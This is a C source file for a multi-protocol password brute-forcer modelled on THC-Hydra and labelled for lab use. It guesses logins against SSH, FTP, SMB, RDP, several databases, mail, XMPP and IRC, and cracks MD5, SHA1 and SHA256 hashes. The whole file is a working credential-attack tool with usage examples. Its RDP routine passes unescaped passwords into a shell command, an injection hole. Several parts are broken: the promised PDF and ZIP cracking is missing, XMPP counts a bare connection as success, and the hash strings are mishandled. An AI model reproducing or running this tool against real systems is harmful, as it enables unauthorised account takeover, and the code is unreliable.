/*
    Advanced Multi-Protocol Brute-Forcer (Educational/Lab Use Only)
    Inspired by THC-Hydra, but single file for academic demonstration.
    Protocols: SSH, FTP, SMB, MySQL, XMPP, SMTP, IMAP, RDP, HTTP, HTTPS,
               Oracle, MSSQL, PostgreSQL, IRC, Hash (PDF/ZIP/Raw), MongoDB.
    Compile with:
      gcc -o lab_bruteforce lab_bruteforce.c \
        -lpthread -lssh -lcurl -lsmbclient -lmysqlclient -lstrophe -lssl -lcrypto -lpq -lsybdb -lmongoc-1.0 -lbson-1.0
    (You must install the relevant dev libraries as noted above)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <libssh/libssh.h>
#include <curl/curl.h>
#include <smbclient.h>
#include <mysql/mysql.h>
#include <strophe.h>
#include <openssl/ssl.h>
#include <openssl/evp.h>
#include <openssl/md5.h>
#include <openssl/sha.h>
#include <libpq-fe.h>
#include <mongoc/mongoc.h>
#include <sybfront.h>
#include <sybdb.h>
#include <sys/wait.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define MAX_USERS 1024
#define MAX_PASSWORDS 100000
#define MAX_LINE 256
#define MAX_HASHES 65536
#define ORACLE_TNS_BUF 4096

typedef struct {
    char *user;
    char *pass;
    char *target;
    int port;
    int ssl;
} job_t;

typedef struct {
    job_t *jobs;
    int job_count;
    int cur_job;
    pthread_mutex_t lock;
    int found;
} workqueue_t;

typedef struct {
    workqueue_t *queue;
    int id;
    int debug;
} thread_arg_t;

char *users[MAX_USERS];
char *passwords[MAX_PASSWORDS];
int user_count = 0, pass_count = 0;
int threads = 1;
int debug = 0;
char *service = NULL;
char *target = NULL;
int port = 0;
int use_ssl = 0;
char *hashfile = NULL;
int hash_mode = 0;
char *hashes[MAX_HASHES];
int hash_count = 0;

void usage() {
    printf(
        "Advanced Multi-Protocol Brute-Forcer (Lab Use Only)\n"
        "Usage: ./lab_bruteforce [options] <protocol://target>\n"
        "Options:\n"
        "  -l <user>         : single username\n"
        "  -L <file>         : file with usernames\n"
        "  -P <file>         : file with passwords\n"
        "  -t <threads>      : number of threads (default 1)\n"
        "  --dbg             : debug mode\n"
        "  -f <file>         : hash file (for pdf/zip/hash mode)\n"
        "  -p <port>         : set port\n"
        "  -S                : use SSL (where supported)\n"
        "Examples:\n"
        "  ./lab_bruteforce -l user -P passwords.txt ssh://ip\n"
        "  ./lab_bruteforce -L users.txt -P passwords.txt ftp://ip\n"
        "  ./lab_bruteforce -f hashes.txt pdf\n"
    );
    exit(1);
}
void die(const char *msg) { fprintf(stderr, "%s\n", msg); exit(1); }
int read_lines(const char *filename, char **arr, int max) {
    FILE *f = fopen(filename, "r");
    if (!f) die("Failed to open file");
    char buf[MAX_LINE];
    int cnt = 0;
    while (fgets(buf, sizeof(buf), f) && cnt < max) {
        buf[strcspn(buf, "\r\n")] = 0;
        if (strlen(buf) > 0) arr[cnt++] = strdup(buf);
    }
    fclose(f);
    return cnt;
}

// ---- Protocol implementations ----

// SSH (libssh)
int try_ssh(char *user, char *pass, char *target, int port, int debug) {
    ssh_session session = ssh_new();
    if (!session) return -1;
    ssh_options_set(session, SSH_OPTIONS_HOST, target);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, user);
    int rc = ssh_connect(session);
    if (rc != SSH_OK) { ssh_free(session); return -1; }
    rc = ssh_userauth_password(session, NULL, pass);
    ssh_disconnect(session); ssh_free(session);
    return rc == SSH_AUTH_SUCCESS ? 0 : -1;
}

// FTP (libcurl)
int try_ftp(char *user, char *pass, char *target, int port, int debug) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    char url[256]; snprintf(url, sizeof(url), "ftp://%s:%d/", target, port);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERNAME, user);
    curl_easy_setopt(curl, CURLOPT_PASSWORD, pass);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return res == CURLE_OK ? 0 : -1;
}

// SMB (libsmbclient)
int try_smb(char *user, char *pass, char *target, int port, int debug) {
    char url[256]; snprintf(url, sizeof(url), "smb://%s/", target);
    SMBCCTX *ctx = smbc_new_context();
    if (!ctx) return -1;
    smbc_init_context(ctx);
    smbc_setOptionUserData(ctx, (void*)user);
    smbc_setOptionAuthFunction(ctx, NULL); // Use default
    smbc_setOptionPassword(ctx, pass);
    smbc_setOptionWorkgroup(ctx, "");
    smbc_setOptionPort(ctx, port);
    smbc_setOptionTimeout(ctx, 2);
    smbc_set_context(ctx);
    int fd = smbc_open(ctx, url, O_RDONLY, 0);
    if (fd >= 0) { smbc_close(ctx, fd); smbc_free_context(ctx, 1); return 0; }
    smbc_free_context(ctx, 1);
    return -1;
}

// MySQL (libmysqlclient)
int try_mysql(char *user, char *pass, char *target, int port, int debug) {
    MYSQL *conn = mysql_init(NULL);
    if (!conn) return -1;
    if (!mysql_real_connect(conn, target, user, pass, NULL, port, NULL, 0)) {
        mysql_close(conn); return -1;
    }
    mysql_close(conn);
    return 0;
}

// XMPP (libstrophe)
int try_xmpp(char *user, char *pass, char *target, int port, int debug) {
    xmpp_ctx_t *ctx; xmpp_conn_t *conn;
    xmpp_initialize();
    ctx = xmpp_ctx_new(NULL, NULL);
    conn = xmpp_conn_new(ctx);
    xmpp_conn_set_jid(conn, user);
    xmpp_conn_set_pass(conn, pass);
    if (xmpp_connect_client(conn, target, port, NULL, NULL) != XMPP_EOK) {
        xmpp_conn_release(conn); xmpp_ctx_free(ctx); xmpp_shutdown(); return -1;
    }
    xmpp_conn_release(conn); xmpp_ctx_free(ctx); xmpp_shutdown(); return 0;
}

// SMTP (socket/OpenSSL)
int try_smtp(char *user, char *pass, char *target, int port, int ssl, int debug) {
    int sock; struct sockaddr_in serv_addr; struct hostent *server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    server = gethostbyname(target); if (!server) { close(sock); return -1; }
    memset(&serv_addr,0,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) { close(sock); return -1; }
    FILE *smtp = fdopen(sock, "r+");
    char buf[1024];
    fgets(buf, sizeof(buf), smtp); // Banner
    fprintf(smtp, "EHLO test\r\n"); fflush(smtp); fgets(buf, sizeof(buf), smtp);
    fprintf(smtp, "AUTH LOGIN\r\n"); fflush(smtp); fgets(buf, sizeof(buf), smtp);
    char user64[256], pass64[256];
    EVP_EncodeBlock((unsigned char*)user64, (unsigned char*)user, strlen(user));
    EVP_EncodeBlock((unsigned char*)pass64, (unsigned char*)pass, strlen(pass));
    fprintf(smtp, "%s\r\n", user64); fflush(smtp); fgets(buf, sizeof(buf), smtp);
    fprintf(smtp, "%s\r\n", pass64); fflush(smtp); fgets(buf, sizeof(buf), smtp);
    int ok = (strstr(buf, "235") != NULL);
    fclose(smtp);
    close(sock);
    return ok ? 0 : -1;
}

// IMAP (libcurl)
int try_imap(char *user, char *pass, char *target, int port, int debug) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    char url[256]; snprintf(url, sizeof(url), "imap://%s:%d/", target, port);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERNAME, user);
    curl_easy_setopt(curl, CURLOPT_PASSWORD, pass);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return res == CURLE_OK ? 0 : -1;
}

// RDP (FreeRDP via subprocess)
int try_rdp(char *user, char *pass, char *target, int port, int debug) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "xfreerdp /u:%s /p:%s /v:%s:%d +auth-only /cert:ignore > /dev/null 2>&1", user, pass, target, port);
    int ret = system(cmd);
    return (WEXITSTATUS(ret) == 0) ? 0 : -1;
}

// HTTP/HTTPS (libcurl)
int try_http(char *user, char *pass, char *target, int port, int ssl, int debug) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    char url[256];
    snprintf(url, sizeof(url), "%s://%s:%d/", ssl ? "https" : "http", target, port);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERNAME, user);
    curl_easy_setopt(curl, CURLOPT_PASSWORD, pass);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return res == CURLE_OK ? 0 : -1;
}

// Oracle TNS protocol (no OCI, inspired by hydra-oracle)
int oracle_tns_connect_packet(char *buf, int max, const char *service) {
    char connect_data[256];
    snprintf(connect_data, sizeof(connect_data),
        "(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=%s)))", service);
    int connect_data_len = strlen(connect_data);

    int pktlen = 58 + connect_data_len;
    if (pktlen > max) return -1;
    memset(buf, 0, pktlen);
    buf[0] = (pktlen >> 8) & 0xff;
    buf[1] = (pktlen) & 0xff;
    buf[2] = 1; // TNS connect
    buf[4] = 1; // Version
    buf[8] = (connect_data_len >> 8) & 0xff;
    buf[9] = (connect_data_len) & 0xff;
    memcpy(buf + 58, connect_data, connect_data_len);
    return pktlen;
}
int oracle_tns_login_packet(char *buf, int max, const char *user, const char *pass) {
    int ulen = strlen(user), plen = strlen(pass);
    int pktlen = 67 + ulen + plen;
    if (pktlen > max) return -1;
    memset(buf, 0, pktlen);
    buf[0] = (pktlen >> 8) & 0xff;
    buf[1] = (pktlen) & 0xff;
    buf[2] = 6; // LOGON
    buf[8] = ulen;
    memcpy(buf + 9, user, ulen);
    buf[9 + ulen] = plen;
    memcpy(buf + 10 + ulen, pass, plen);
    return pktlen;
}
int try_oracle(char *user, char *pass, char *target, int port, int debug) {
    int sock;
    struct sockaddr_in sa;
    struct hostent *he;
    char buf[ORACLE_TNS_BUF];

    he = gethostbyname(target);
    if (!he) return -1;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    memcpy(&sa.sin_addr, he->h_addr, he->h_length);

    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        close(sock); return -1;
    }
    int pktlen = oracle_tns_connect_packet(buf, sizeof(buf), "ORCL"); // or replace with SID/SERVICE
    if (pktlen < 0) { close(sock); return -1; }
    if (write(sock, buf, pktlen) != pktlen) { close(sock); return -1; }

    int r = read(sock, buf, sizeof(buf));
    if (r <= 0) { close(sock); return -1; }

    pktlen = oracle_tns_login_packet(buf, sizeof(buf), user, pass);
    if (pktlen < 0) { close(sock); return -1; }
    if (write(sock, buf, pktlen) != pktlen) { close(sock); return -1; }
    r = read(sock, buf, sizeof(buf));
    close(sock);

    if (r > 0 && strstr(buf, "ORA-01017")) return -1;
    if (r > 0) return 0;
    return -1;
}

// MSSQL (FreeTDS)
int try_mssql(char *user, char *pass, char *target, int port, int debug) {
    DBPROCESS *dbproc;
    LOGINREC *login;
    dbinit();
    login = dblogin();
    DBSETLUSER(login, user);
    DBSETLPWD(login, pass);
    dbsetlogintime(2);
    dbproc = dbopen(login, target);
    if (!dbproc) { dbexit(); return -1; }
    dbclose(dbproc); dbexit();
    return 0;
}

// PostgreSQL (libpq)
int try_pg(char *user, char *pass, char *target, int port, int debug) {
    char conninfo[256];
    snprintf(conninfo, sizeof(conninfo), "host=%s port=%d user=%s password=%s dbname=postgres connect_timeout=2", target, port, user, pass);
    PGconn *conn = PQconnectdb(conninfo);
    if (PQstatus(conn) == CONNECTION_OK) { PQfinish(conn); return 0; }
    PQfinish(conn); return -1;
}

// IRC (socket)
int try_irc(char *user, char *pass, char *target, int port, int debug) {
    int sock; struct sockaddr_in serv_addr; struct hostent *server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    server = gethostbyname(target); if (!server) { close(sock); return -1; }
    memset(&serv_addr,0,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) { close(sock); return -1; }
    char buf[256];
    snprintf(buf, sizeof(buf), "PASS %s\r\n", pass); send(sock, buf, strlen(buf), 0);
    snprintf(buf, sizeof(buf), "NICK %s\r\n", user); send(sock, buf, strlen(buf), 0);
    snprintf(buf, sizeof(buf), "USER %s 0 * :hydra\r\n", user); send(sock, buf, strlen(buf), 0);
    int ok = 0;
    if (recv(sock, buf, sizeof(buf), 0) > 0 && strstr(buf, "001")) ok = 1;
    close(sock);
    return ok ? 0 : -1;
}

// MongoDB (mongo-c-driver)
int try_mongodb(char *user, char *pass, char *target, int port, int debug) {
    mongoc_init();
    char uri[256];
    snprintf(uri, sizeof(uri), "mongodb://%s:%s@%s:%d/?authSource=admin", user, pass, target, port);
    mongoc_client_t *client = mongoc_client_new(uri);
    bson_error_t error;
    mongoc_database_t *db = mongoc_client_get_database(client, "admin");
    bool ok = mongoc_database_command_simple(db, NULL, NULL, NULL, &error);
    mongoc_database_destroy(db);
    mongoc_client_destroy(client);
    mongoc_cleanup();
    return ok ? 0 : -1;
}

// -- Hash mode (OpenSSL)
int crack_hashes(const char *hashfile, const char **passwords, int pass_count) {
    FILE *f = fopen(hashfile, "r");
    if (!f) die("Cannot open hash file");
    char hash[MAX_LINE];
    int matched = 0;
    while (fgets(hash, sizeof(hash), f)) {
        hash[strcspn(hash, "\r\n")] = 0;
        for (int i = 0; i < pass_count; i++) {
            unsigned char md[SHA256_DIGEST_LENGTH];
            char mdhex[65];
            // MD5
            MD5((unsigned char*)passwords[i], strlen(passwords[i]), md);
            for (int j = 0; j < 16; j++) sprintf(mdhex+2*j, "%02x", md[j]);
            if (strcasecmp(hash, mdhex) == 0) { printf("MD5 match: %s : %s\n", hash, passwords[i]); matched++; break; }
            // SHA1
            SHA1((unsigned char*)passwords[i], strlen(passwords[i]), md);
            for (int j = 0; j < 20; j++) sprintf(mdhex+2*j, "%02x", md[j]);
            mdhex[40] = 0;
            if (strcasecmp(hash, mdhex) == 0) { printf("SHA1 match: %s : %s\n", hash, passwords[i]); matched++; break; }
            // SHA256
            SHA256((unsigned char*)passwords[i], strlen(passwords[i]), md);
            for (int j = 0; j < 32; j++) sprintf(mdhex+2*j, "%02x", md[j]);
            mdhex[64] = 0;
            if (strcasecmp(hash, mdhex) == 0) { printf("SHA256 match: %s : %s\n", hash, passwords[i]); matched++; break; }
        }
    }
    fclose(f);
    return matched;
}

// ---- Thread worker ----
void *thread_worker(void *arg) {
    thread_arg_t *targ = (thread_arg_t*)arg;
    workqueue_t *q = targ->queue;
    int debug = targ->debug;
    while (1) {
        pthread_mutex_lock(&q->lock);
        if (q->cur_job >= q->job_count || q->found) {
            pthread_mutex_unlock(&q->lock);
            break;
        }
        job_t job = q->jobs[q->cur_job++];
        pthread_mutex_unlock(&q->lock);
        int res = -1;
        if (strcmp(service,"ssh")==0)
            res = try_ssh(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"ftp")==0)
            res = try_ftp(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"smb")==0)
            res = try_smb(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"mysql")==0)
            res = try_mysql(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"xmpp")==0)
            res = try_xmpp(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"smtp")==0)
            res = try_smtp(job.user, job.pass, job.target, job.port, use_ssl, debug);
        else if (strcmp(service,"imap")==0)
            res = try_imap(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"rdp")==0)
            res = try_rdp(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"http")==0 || strcmp(service,"https")==0)
            res = try_http(job.user, job.pass, job.target, job.port, use_ssl, debug);
        else if (strcmp(service,"oracle")==0)
            res = try_oracle(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"mssql")==0)
            res = try_mssql(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"postgres")==0)
            res = try_pg(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"irc")==0)
            res = try_irc(job.user, job.pass, job.target, job.port, debug);
        else if (strcmp(service,"mongodb")==0)
            res = try_mongodb(job.user, job.pass, job.target, job.port, debug);
        else {
            if (debug) printf("[T%d] Unsupported protocol: %s\n", targ->id, service);
            continue;
        }
        if (res == 0) {
            pthread_mutex_lock(&q->lock);
            q->found = 1;
            printf("\n*** FOUND: %s:%s\n", job.user, job.pass);
            pthread_mutex_unlock(&q->lock);
            break;
        } else if (debug) {
            printf("[T%d] FAIL: %s:%s\n", targ->id, job.user, job.pass);
        }
    }
    return NULL;
}

// ---- Main ----
int main(int argc, char *argv[]) {
    int opt;
    char *username = NULL, *userfile = NULL, *passfile = NULL;
    static struct option longopts[] = {
        {"dbg",     no_argument,      0,  1001 },
        {"threads", required_argument,0,  't' },
        {0,0,0,0}
    };
    while ((opt = getopt_long(argc, argv, "l:L:P:t:p:f:S", longopts, NULL)) != -1) {
        switch (opt) {
            case 'l': username = optarg; break;
            case 'L': userfile = optarg; break;
            case 'P': passfile = optarg; break;
            case 't': threads = atoi(optarg); break;
            case 'p': port = atoi(optarg); break;
            case 'S': use_ssl = 1; break;
            case 'f': hashfile = optarg; hash_mode=1; break;
            case 1001: debug = 1; break;
            default: usage();
        }
    }
    if (optind >= argc && !hash_mode) usage();
    if (hash_mode && !hashfile) usage();

    // Protocol/target parsing
    if (!hash_mode) {
        char proto[32], tgt[256];
        if (sscanf(argv[optind], "%31[^:]://%255s", proto, tgt) != 2) usage();
        service = strdup(proto);
        target = strdup(tgt);
    }

    // Username(s)
    if (username) {
        users[user_count++] = strdup(username);
    } else if (userfile) {
        user_count = read_lines(userfile, users, MAX_USERS);
        if (!user_count) die("No users loaded");
    } else if (!hash_mode) {
        die("Username or user file required");
    }

    // Password(s)
    if (passfile) {
        pass_count = read_lines(passfile, passwords, MAX_PASSWORDS);
        if (!pass_count) die("No passwords loaded");
    } else if (!hash_mode) {
        die("Password file required");
    }

    // Hash mode (pdf/zip/hash)
    if (hash_mode) {
        crack_hashes(hashfile, (const char**)passwords, pass_count);
        exit(0);
    }

    // Port defaulting
    if (!port) {
        if (strcmp(service,"ssh")==0) port=22;
        else if (strcmp(service,"ftp")==0) port=21;
        else if (strcmp(service,"smb")==0) port=445;
        else if (strcmp(service,"mysql")==0) port=3306;
        else if (strcmp(service,"xmpp")==0) port=5222;
        else if (strcmp(service,"smtp")==0) port=25;
        else if (strcmp(service,"imap")==0) port=143;
        else if (strcmp(service,"rdp")==0) port=3389;
        else if (strcmp(service,"http")==0) port=80;
        else if (strcmp(service,"https")==0) port=443;
        else if (strcmp(service,"oracle")==0) port=1521;
        else if (strcmp(service,"mssql")==0) port=1433;
        else if (strcmp(service,"postgres")==0) port=5432;
        else if (strcmp(service,"irc")==0) port=6667;
        else if (strcmp(service,"mongodb")==0) port=27017;
        else port=0;
    }

    // Build jobs
    workqueue_t queue;
    queue.job_count = user_count * pass_count;
    queue.jobs = malloc(queue.job_count * sizeof(job_t));
    int idx = 0;
    for (int i=0; i<user_count; i++) {
        for (int j=0; j<pass_count; j++) {
            queue.jobs[idx].user = users[i];
            queue.jobs[idx].pass = passwords[j];
            queue.jobs[idx].target = target;
            queue.jobs[idx].port = port;
            queue.jobs[idx].ssl = use_ssl;
            idx++;
        }
    }
    queue.cur_job = 0;
    queue.found = 0;
    pthread_mutex_init(&queue.lock, NULL);

    // Threading
    pthread_t *tids = malloc(threads * sizeof(pthread_t));
    thread_arg_t *targs = malloc(threads * sizeof(thread_arg_t));
    printf("Starting %d thread(s) on service: %s, target: %s port: %d\n", threads, service, target, port);
    for (int t=0; t<threads; t++) {
        targs[t].queue = &queue;
        targs[t].id = t;
        targs[t].debug = debug;
        pthread_create(&tids[t], NULL, thread_worker, &targs[t]);
    }
    for (int t=0; t<threads; t++) pthread_join(tids[t], NULL);

    if (!queue.found) printf("No valid credentials found.\n");

    // Cleanup
    for (int i=0; i<user_count; i++) free(users[i]);
    for (int i=0; i<pass_count; i++) free(passwords[i]);
    free(queue.jobs);
    free(tids);
    free(targs);
    if (service) free(service);
    if (target) free(target);

    return 0;
}
